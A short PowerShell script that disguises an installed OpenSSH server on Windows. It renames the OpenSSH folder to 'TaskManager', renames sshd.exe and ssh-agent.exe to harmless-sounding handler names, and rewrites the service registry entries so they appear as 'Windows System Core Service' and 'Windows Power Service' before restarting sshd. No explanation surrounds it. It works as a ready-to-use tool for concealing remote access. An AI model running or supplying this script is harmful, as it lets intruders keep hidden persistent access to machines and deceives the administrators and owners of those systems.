$oldFolderPath = "C:\Program Files\OpenSSH"
    $newFolderPath = "C:\Program Files\TaskManager"
    Rename-Item -Path $oldFolderPath -NewName $newFolderPath -Force
$oldFilePath = "C:\Program Files\TaskManager\sshd.exe"
    $newFilePath = "C:\Program Files\TaskManager\IP-Handler.exe"
    Rename-Item -Path $oldFilePath -NewName $newFilePath -Force
$oldFilePath = "C:\Program Files\TaskManager\ssh-agent.exe"
    $newFilePath = "C:\Program Files\TaskManager\Update-Handler.exe"
    Rename-Item -Path $oldFilePath -NewName $newFilePath -Force
$sshregkey = "HKLM:\SYSTEM\CurrentControlSet\Services\sshd"
Set-ItemProperty -Path $sshregkey -Name "DisplayName" -Value "Windows System Core Service"
Set-ItemProperty -Path $sshregkey -Name "Description" -Value "Windows System Essential Services"
Set-ItemProperty -Path $sshregkey -Name "ImagePath" -Value "C:\Program Files\TaskManager\IP-Handler.exe"
$sshregkey = "HKLM:\SYSTEM\CurrentControlSet\Services\ssh-agent"
Set-ItemProperty -Path $sshregkey -Name "DisplayName" -Value "Windows Power Service"
Set-ItemProperty -Path $sshregkey -Name "Description" -Value "Windows System Essential Services"
Set-ItemProperty -Path $sshregkey -Name "ImagePath" -Value "C:\Program Files\TaskManager\Update-Handler.exe"
Restart-Service sshd